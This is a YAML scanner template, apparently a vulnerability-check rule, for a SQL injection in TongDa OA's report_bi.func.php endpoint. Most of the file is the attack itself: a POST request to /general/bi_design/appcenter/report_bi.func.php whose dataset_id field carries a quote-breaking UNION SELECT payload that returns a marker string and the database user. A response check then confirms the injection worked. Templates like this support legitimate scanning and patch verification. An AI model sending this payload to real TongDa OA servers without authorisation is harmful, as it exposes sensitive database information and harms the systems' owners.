name: TongDa_OA_report_bi.func.php_SQLI
transport: http
set: {}
detail:
  dock: app="TongDa-OA"
  product: TongDa OA
  homepage: http://www.tongda2000.com/
  impact: <p>There is a SQL injection vulnerability in TongDa OA, The user is the
    root user with the highest authority, which can be used by attackers to obtain
    sensitive database information.<br></p>
  description: There is a SQL injection vulnerability in TongDa OA, which can be used
    by attackers to obtain sensitive database information.
rules:
  r1:
    method: POST
    url: /general/bi_design/appcenter/report_bi.func.php
    body: _POST[dataset_id]=efgh'-@`'`)union select 0x313439346435333938633862396666323965343763383331,2,user()#'&action=get_link_info&
    expression: response.status == 200 && response.body.bcontains(b"1494d5398c8b9ff29e47c831")
expression: r1()
